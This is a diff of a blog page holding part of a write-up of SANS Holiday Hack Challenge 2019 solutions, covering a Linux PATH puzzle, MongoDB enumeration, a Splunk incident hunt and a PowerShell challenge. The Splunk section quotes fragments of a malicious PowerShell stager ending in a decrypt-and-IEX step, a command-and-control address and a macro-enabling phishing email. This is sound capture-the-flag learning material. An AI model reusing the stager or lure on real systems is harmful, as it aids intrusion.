@@ -1,63 +1,16 @@
-<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1">
-<link href=/css/fonts.css rel=stylesheet type=text/css>
-<title>Some SANS Holiday Hack 2019 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css>
-<link rel=stylesheet href=/css/fork-awesome.min.css>
-<link href=https://parsiya.net/favicon.png rel=icon>
-<meta name=description content>
-<meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]">
-<meta name=author content="Parsia">
-<meta name=generator content="Hugo 0.93.0">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="Some SANS Holiday Hack 2019 Solutions">
-<meta name=twitter:description content="I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2019 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.96.0"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2019 Solutions"><meta name=twitter:description content="I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
 year I participated for the first time. You can find the solutions below:
 
 SANS Holiday Hack 2018 Solutions
-">
-<meta name=twitter:domain content="parsiya.net">
-<meta name=twitter:creator content="@CryptoGangsta">
-</head><body>
-<header role=banner>
-<hgroup>
-<h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
-complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation>
-<fieldset class=mobile-nav>
-<select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select>
-</fieldset><ul class=main-navigation>
-<li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription>
-<a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a>
-</ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer">
-<fieldset role=search>
-<input class=search type=text name=q results=0 placeholder=Search>
-<input type=hidden name=q value=site:https://parsiya.net/>
-</fieldset></form></nav><div id=main>
-<div id=content>
-<div>
-<article class=hentry role=article>
-<header>
-<p class=meta>Jan 15, 2020
+"><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
+complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
+<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 15, 2020
 - 24 minute read
 - <a href=https://parsiya.net/blog/2020-01-15-some-sans-holiday-hack-2019-solutions/#disqus_thread>Comments</a>
-- <a class=label href=https://parsiya.net/categories/crypto/>Crypto </a><a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack </a>
-</p><h1 class=entry-title>
-Some SANS Holiday Hack 2019 Solutions
-</h1></header><div class=entry-content>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed</a></li><li><a href=#sugarplum-mary---linux-path>SugarPlum Mary - Linux Path</a></li><li><a href=#holy-evergreen---mongo-pilfer>Holy Evergreen - Mongo Pilfer</a></li><li><a href=#6-splunk>6. Splunk</a></li><li><a href=#xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry</a></li><li><a href=#alabaster-snowball---nyancat-shell>Alabaster Snowball - NYANCAT Shell</a></li><li><a href=#2-letter>2. Letter</a></li><li><a href=#tangle-coalbox---frosty-keypad>Tangle Coalbox - Frosty Keypad</a></li><li><a href=#pepper-minstix---graylog>Pepper Minstix - Graylog</a>
-<ul>
-<li><a href=#questions>Questions</a>
-<ul>
-<li><a href=#question-1>Question 1</a></li><li><a href=#question-2>Question 2</a></li><li><a href=#question-3>Question 3</a></li><li><a href=#question-4>Question 4</a></li><li><a href=#question-5>Question 5</a></li><li><a href=#question-6>Question 6</a></li><li><a href=#question-7>Question 7</a></li><li><a href=#question-8>Question 8</a></li><li><a href=#question-9>Question 9</a></li><li><a href=#question-10>Question 10</a></li></ul></li></ul></li><li><a href=#kent-tinseltooth---smart-braces>Kent Tinseltooth - Smart Braces</a></li><li><a href=#find-the-turtle-doves>Find the Turtle Doves</a></li><li><a href=#3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome</a></li><li><a href=#4-windows-log-analysis-determine-attacker-technique>4. Windows Log Analysis: Determine Attacker Technique</a></li><li><a href=#5-network-log-analysis-determine-compromised-system>5. Network Log Analysis: Determine Compromised System</a></li></ul></nav><p>I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
-year I participated for the first time. You can find the solutions below:</p><ul>
-<li><a href=/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/ title="SANS Holiday Hack 2018 Solutions">SANS Holiday Hack 2018 Solutions</a></li></ul><h1 id=bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed
-<a class=header-link href=#bushy-evergreen---quit-ed><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Answer: <code>q</code>.</p><h1 id=sugarplum-mary---linux-path>SugarPlum Mary - Linux Path
-<a class=header-link href=#sugarplum-mary---linux-path><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Answer: <code>/bin/ls</code>.</p><pre tabindex=0><code>$ ls
+- <a class=label href=https://parsiya.net/categories/crypto/>Crypto </a><a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>Some SANS Holiday Hack 2019 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed</a></li><li><a href=#sugarplum-mary---linux-path>SugarPlum Mary - Linux Path</a></li><li><a href=#holy-evergreen---mongo-pilfer>Holy Evergreen - Mongo Pilfer</a></li><li><a href=#6-splunk>6. Splunk</a></li><li><a href=#xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry</a></li><li><a href=#alabaster-snowball---nyancat-shell>Alabaster Snowball - NYANCAT Shell</a></li><li><a href=#2-letter>2. Letter</a></li><li><a href=#tangle-coalbox---frosty-keypad>Tangle Coalbox - Frosty Keypad</a></li><li><a href=#pepper-minstix---graylog>Pepper Minstix - Graylog</a><ul><li><a href=#questions>Questions</a><ul><li><a href=#question-1>Question 1</a></li><li><a href=#question-2>Question 2</a></li><li><a href=#question-3>Question 3</a></li><li><a href=#question-4>Question 4</a></li><li><a href=#question-5>Question 5</a></li><li><a href=#question-6>Question 6</a></li><li><a href=#question-7>Question 7</a></li><li><a href=#question-8>Question 8</a></li><li><a href=#question-9>Question 9</a></li><li><a href=#question-10>Question 10</a></li></ul></li></ul></li><li><a href=#kent-tinseltooth---smart-braces>Kent Tinseltooth - Smart Braces</a></li><li><a href=#find-the-turtle-doves>Find the Turtle Doves</a></li><li><a href=#3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome</a></li><li><a href=#4-windows-log-analysis-determine-attacker-technique>4. Windows Log Analysis: Determine Attacker Technique</a></li><li><a href=#5-network-log-analysis-determine-compromised-system>5. Network Log Analysis: Determine Compromised System</a></li></ul></nav><p>I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
+year I participated for the first time. You can find the solutions below:</p><ul><li><a href=/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/ title="SANS Holiday Hack 2018 Solutions">SANS Holiday Hack 2018 Solutions</a></li></ul><h1 id=bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed
+<a class=header-link href=#bushy-evergreen---quit-ed><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>q</code>.</p><h1 id=sugarplum-mary---linux-path>SugarPlum Mary - Linux Path
+<a class=header-link href=#sugarplum-mary---linux-path><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>/bin/ls</code>.</p><pre tabindex=0><code>$ ls
 This isn&#39;t the ls you&#39;re looking for
 elf@772e4d3f58fc:~$ which ls
 /usr/local/bin/ls
@@ -139,8 +92,7 @@ Get Elfed at ElfU!
 Be present in class
 Fight, win, kick some grinch!
 </code></pre><h1 id=holy-evergreen---mongo-pilfer>Holy Evergreen - Mongo Pilfer
-<a class=header-link href=#holy-evergreen---mongo-pilfer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Answer <code>db.loadServerScripts();displaySolution();</code>.</p><p>Find the mongo DB location</p><pre tabindex=0><code>elf@5503e3f7a93a:~$ ps auxww
+<a class=header-link href=#holy-evergreen---mongo-pilfer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer <code>db.loadServerScripts();displaySolution();</code>.</p><p>Find the mongo DB location</p><pre tabindex=0><code>elf@5503e3f7a93a:~$ ps auxww
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 elf          1  0.1  0.0  18508  3556 pts/0    Ss   03:50   0:00 /bin/bash
 mongo        9  3.9  0.1 1014596 59016 ?       Sl   03:50   0:01 /usr/bin/mongod
@@ -206,8 +158,7 @@ redherring
         }
 ]
 &gt; 
-</code></pre><p>Seems like it's not there. Let's look at the log path then. Nothing there either.</p><p>The hint points to this page</p><ul>
-<li><a href=https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases target=_blank rel="noreferrer noopener">https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases</a></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>&gt; db.adminCommand( { listDatabases: 1 } )
+</code></pre><p>Seems like it's not there. Let's look at the log path then. Nothing there either.</p><p>The hint points to this page</p><ul><li><a href=https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases target=_blank rel="noreferrer noopener">https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases</a></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>&gt; db.adminCommand( { listDatabases: 1 } )
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;databases&#34;</span> : [
 </span></span><span style=display:flex><span>                {
@@ -283,14 +234,7 @@ tincan
 { &#34;_id&#34; : &#34;You did good! Just run the command between the stars:
     ** db.loadServerScripts();displaySolution(); **&#34; }
 </code></pre><h1 id=6-splunk>6. Splunk
-<a class=header-link href=#6-splunk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Answer: <code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p><a href=https://splunk.elfu.org/ target=_blank rel="noreferrer noopener">https://splunk.elfu.org/</a> with the username: <code>elf</code> / Password: <code>elfsocks</code>.</p><ul>
-<li>What was the message for Kent that the adversary embedded in this attack?</li></ul><ol>
-<li>What is the short host name of Professor Banas' computer?
-<ul>
-<li><code>sweetums</code></li></ul></li><li>What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
-<ul>
-<li><code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code></li><li>Search for <code>santa</code> and see what files are accessed.</li></ul><pre tabindex=0><code>Message=CommandInvocation(Get-ChildItem): &#34;Get-ChildItem&#34;
+<a class=header-link href=#6-splunk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p><a href=https://splunk.elfu.org/ target=_blank rel="noreferrer noopener">https://splunk.elfu.org/</a> with the username: <code>elf</code> / Password: <code>elfsocks</code>.</p><ul><li>What was the message for Kent that the adversary embedded in this attack?</li></ul><ol><li>What is the short host name of Professor Banas' computer?<ul><li><code>sweetums</code></li></ul></li><li>What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)<ul><li><code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code></li><li>Search for <code>santa</code> and see what files are accessed.</li></ul><pre tabindex=0><code>Message=CommandInvocation(Get-ChildItem): &#34;Get-ChildItem&#34;
 ParameterBinding(Get-ChildItem): name=&#34;Recurse&#34;; value=&#34;True&#34;
 ParameterBinding(Get-ChildItem): name=&#34;Path&#34;; value=&#34;C:\Users\cbanas&#34;
 ParameterBinding(Get-ChildItem): name=&#34;File&#34;; value=&#34;True&#34;
@@ -304,24 +248,15 @@ ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Bing.ur
 ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Desktop.lnk&#34;
 ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Downloads.lnk&#34;
 ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;winrt--{S-1-5-21-1217370868-2414566453-2573080502-1004}-.searchconnector-ms&#34;
-</code></pre></li><li>What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)
-<ul>
-<li>Searched for <code>144.202.46.214</code> (from the PowerShell thing) and found <code>144.202.46.214.vultr.com</code></li></ul></li><li>What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)
-<ul>
-<li>Search for <code>sourcetype=WinEventLog EventCode=4688</code></li><li>Click on <code>Creator_Process_Name</code> in the left.</li><li>Click on <code>Rare Values</code></li><li>See 14 values. We are looking for a document so we click on the <code>winword.exe</code> process and see its process ID.</li><li>Search for that process ID <code>index=main sourcetype=WinEventLog EventCode=4688 0x187c</code></li><li>Find the event for the process that launched word and the command line has the document name. <code>19th Century Holiday Cheer Assignment.docm</code></li></ul><pre tabindex=0><code>&#34;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&#34; /n
+</code></pre></li><li>What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)<ul><li>Searched for <code>144.202.46.214</code> (from the PowerShell thing) and found <code>144.202.46.214.vultr.com</code></li></ul></li><li>What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)<ul><li>Search for <code>sourcetype=WinEventLog EventCode=4688</code></li><li>Click on <code>Creator_Process_Name</code> in the left.</li><li>Click on <code>Rare Values</code></li><li>See 14 values. We are looking for a document so we click on the <code>winword.exe</code> process and see its process ID.</li><li>Search for that process ID <code>index=main sourcetype=WinEventLog EventCode=4688 0x187c</code></li><li>Find the event for the process that launched word and the command line has the document name. <code>19th Century Holiday Cheer Assignment.docm</code></li></ul><pre tabindex=0><code>&#34;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&#34; /n
 &#34;C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm&#34; /o &#34;&#34;
-</code></pre></li><li>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)
-<ul>
-<li><code>index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | dedup results{}.workers.smtp.from</code></li><li>Returns 22, but one is the professor's email. So answer is <code>21</code>.</li></ul></li><li>What was the password for the zip archive that contained the suspicious file?
-<ul>
-<li>We have seen it, add <code>password</code> to the search.</li><li>It's an email from <code>bradly buttercups &lt;bradly.buttercups@eifu.org></code></li></ul><pre tabindex=0><code>Professor Banas, I have completed my assignment. Please open the attached
+</code></pre></li><li>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)<ul><li><code>index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | dedup results{}.workers.smtp.from</code></li><li>Returns 22, but one is the professor's email. So answer is <code>21</code>.</li></ul></li><li>What was the password for the zip archive that contained the suspicious file?<ul><li>We have seen it, add <code>password</code> to the search.</li><li>It's an email from <code>bradly buttercups &lt;bradly.buttercups@eifu.org></code></li></ul><pre tabindex=0><code>Professor Banas, I have completed my assignment. Please open the attached
 zip file with password 123456789 and then open the word document to view it.
 You will have to click &#34;Enable Editing&#34; then &#34;Enable Content&#34; to see it.
 This was a fun assignment. I hope you like it!
 
 --Bradly Buttercups
-</code></pre><ul>
-<li><code>123456789</code></li><li>Seems like he cheated because the professors said</li></ul><pre tabindex=0><code>Bradly, 
+</code></pre><ul><li><code>123456789</code></li><li>Seems like he cheated because the professors said</li></ul><pre tabindex=0><code>Bradly, 
 
 I opened your assignment (which was not easy, by the way) and it seems you
 have not only not included an image per the instructions, but your
@@ -329,9 +264,7 @@ assignment is identical to another student&#39;s assignment.  This means your
 grade will be 0/100.  
 
 -csb
-</code></pre></li><li>What email address did the suspicious file come from?
-<ul>
-<li><code>bradly.buttercups@eifu.org</code></li></ul></li></ol><p>Actual message.</p><p>Query finds these two files</p><pre tabindex=0><code>Buttercups_HOL404_assignment.zip
+</code></pre></li><li>What email address did the suspicious file come from?<ul><li><code>bradly.buttercups@eifu.org</code></li></ul></li></ol><p>Actual message.</p><p>Query finds these two files</p><pre tabindex=0><code>Buttercups_HOL404_assignment.zip
     /home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f/Buttercups_HOL404_assignment.zip
 19th Century Holiday Cheer Assignment.docm
     /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af/19th Century Holiday Cheer Assignment.docm
@@ -392,8 +325,7 @@ grade will be 0/100.
 </span></span><span style=display:flex><span><span style=color:#268bd2>$DatA</span> = <span style=color:#268bd2>$dATa</span>[4..<span style=color:#268bd2>$DatA</span>.lENGtH];
 </span></span><span style=display:flex><span> -JOIN<span style=color:#cb4b16>[ChaR[]]</span>(&amp; <span style=color:#268bd2>$R</span> <span style=color:#268bd2>$DatA</span> (<span style=color:#268bd2>$IV</span> + <span style=color:#268bd2>$K</span>))|<span style=color:#b58900>IEX
 </span></span></span></code></pre></div><h1 id=xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry
-<a class=header-link href=#xmas-cheer-laser---sparkle-redberry><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>What is at <code>/home/callingcard.txt.</code>?</p><pre tabindex=0><code>PS /home/elf&gt; gc ../callingcard.txt
+<a class=header-link href=#xmas-cheer-laser---sparkle-redberry><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>What is at <code>/home/callingcard.txt.</code>?</p><pre tabindex=0><code>PS /home/elf&gt; gc ../callingcard.txt
 What&#39;s become of your dear laser?
 Fa la la la la, la la la la
 Seems you can&#39;t now seem to raise her!
@@ -644,8 +576,7 @@ At line:1 char:1
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 --r---          11/18/19  7:53 PM       10006962 EventLog.xml
-</code></pre><p>Let's follow this:</p><ul>
-<li><a href=https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/ target=_blank rel="noreferrer noopener">https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/</a></li></ul><pre tabindex=0><code>PS /&gt; $mylog = Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml
+</code></pre><p>Let's follow this:</p><ul><li><a href=https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/ target=_blank rel="noreferrer noopener">https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/</a></li></ul><pre tabindex=0><code>PS /&gt; $mylog = Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml
 PS /&gt; $mylog | group Id                         
 
 Count Name      Group
@@ -792,8 +723,7 @@ Content-Length: 199
 
 Success! - 5.428 Mega-Jollies of Laser Output Reached!
 </code></pre><h1 id=alabaster-snowball---nyancat-shell>Alabaster Snowball - NYANCAT Shell
-<a class=header-link href=#alabaster-snowball---nyancat-shell><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h1><p>Inside the shell</p><pre tabindex=0><code>nyancat, nyancat
